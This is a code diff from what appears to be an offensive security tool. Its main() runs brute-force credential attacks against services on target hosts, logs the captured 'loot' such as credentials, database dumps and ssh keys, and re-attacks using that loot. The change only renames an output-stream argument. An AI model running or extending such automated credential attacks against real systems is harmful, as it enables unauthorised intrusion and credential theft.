@@ -53,24 +53,24 @@ def main():
         # automate a Hydra-esque attack on this host
         for open_service in host_openings[host]:
             exploit = exploits[open_service]
-            exploit.output = args.output
+            exploit.output = args.outputstream
             exploit.domain = args.domain # mainly important for LDAP
             print(f"Attacking host {host} on port {exploit.port} using {exploit.name}. This may take a while.",
-                    file=args.output)
+                    file=args.outputstream)
             # TODO use multiprocessing to do this asynchronously
             # hydra for everyone but ldap
             initial_loot = exploit.attack(host, args.usernames, args.passwords)
             # loot is a list of tuples (username, password). Either field can be None.
             if initial_loot:
-                log_loot(initial_loot, args.output)
+                log_loot(initial_loot, args.outputstream)
                 # get more info from each service (finger, database dumps, ssh keys, etc.)
                 more_loot = exploit.get_loot(initial_loot)
                 if more_loot:
-                    log_loot(more_loot, args.output)
+                    log_loot(more_loot, args.outputstream)
 
     # attack with our new loot
     if not get_logged_loot():
-        print("Attacks completed. No loot gained.", file=args.output)
+        print("Attacks completed. No loot gained.", file=args.outputstream)
         return
     print("Attack completed. Re-attacking services using gathered loot.")
 
@@ -88,7 +88,7 @@ def main():
         os.remove('data/usernames_cache.txt')
         os.remove('data/passwords_cache.txt')
         if new_loot:
-            log_loot(new_loot, args.output)
+            log_loot(new_loot, args.outputstream)
 
 if __name__=='__main__':
     main()
